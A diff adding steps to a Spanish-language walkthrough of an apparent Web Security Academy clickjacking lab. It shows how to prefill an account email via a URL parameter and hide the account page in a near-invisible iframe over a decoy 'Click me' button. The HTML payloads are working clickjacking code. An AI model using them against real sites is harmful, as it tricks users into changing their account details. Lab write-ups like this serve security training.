@@ -45,15 +45,99 @@ Entonces, de ser cierto, el campo `email` en el formulario:
 ```
 ...puede ser prellenado vía parámetro GET. 
 Esto indica que si accedemos a:
-```perl
+```text
 https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker.com
 ```
-...el valor se carga en el input del formulario sin intervención del usuario. Esto es clave para el ataque de clickjacking.
+...el servidor toma ese valor de email desde los parámetros de la URL y lo utiliza para prellenar el campo del formulario. Esto ocurre sin intervención del usuario, lo cual es fundamental para automatizar el ataque de clickjacking.
 
 Hacemos la prueba y validamos que efectivamente existe la precarga del formulario usando parámetros en la URL:
 ![image](https://github.com/user-attachments/assets/7827582b-0a77-4b77-9053-9dc5948c1496)
 
 Esto se puede combinar con un ataque de clickjacking para presentar un formulario listo para enviar, sobre el cual el usuario haga clic sin saberlo.
+
+
+Al igual que en el laboratorio anterior, accedemos al Exploit server y procedemos a generar nuestrá página atacante.
+Iniciamos ingresando el siguiente código:
+```html
+<iframe src="https://0ae60060043720a1ede85b8500cd0080.web-security-academy.net/my-account?email=test@test.com"></iframe>
+```
+![image](https://github.com/user-attachments/assets/1c02169f-7865-4d1f-ad44-f60f2c937d04)
+
+Seguimos avanzando, ahora agregamos un "botón fake" usando el elemento `<div>` y le damos estilo tanto al `iframe` como al `div`:
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 700px;
+    height: 500px;
+    opacity: 0.1;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 400px;
+    left: 80px;
+    z-index: 1;
+  }
+</style>
+
+<div>Test me</div>
+<iframe src="https://0ae60060043720a1ede85b8500cd0080.web-security-academy.net/my-account?email=test@test.com"></iframe>
+```
+![image](https://github.com/user-attachments/assets/9750adde-fb29-46de-8df2-adfd737749e0)
+
+
+El siguiente paso es alinear el señuelo con el botón real:
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 700px;
+    height: 500px;
+    opacity: 0.1;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 450px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+
+<div>Click me</div>
+<iframe src="https://0ae60060043720a1ede85b8500cd0080.web-security-academy.net/my-account?email=test@test.com"></iframe>
+```
+
+Vemos que los elementos se superponen correctamente y efectivamente el mail está precargado en el formulario:
+![image](https://github.com/user-attachments/assets/34eeab15-dd15-48de-89c2-5d67aafd8da4)
+
+
+Ahora procedemos a bajar la opacidad y a cambiar el mail por un mail que no haya sido registrado:
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 700px;
+    height: 500px;
+    opacity: 0.000001;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 450px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+
+<div>Click me</div>
+<iframe src="https://0ae60060043720a1ede85b8500cd0080.web-security-academy.net/my-account?email=prueba@prueba.com"></iframe>
+```
+
+Vemos que el `iframe` es imperceptible:
+![image](https://github.com/user-attachments/assets/579c6c0c-6a26-4ead-a491-2ee0c6ad42bb)
+
 
 
 
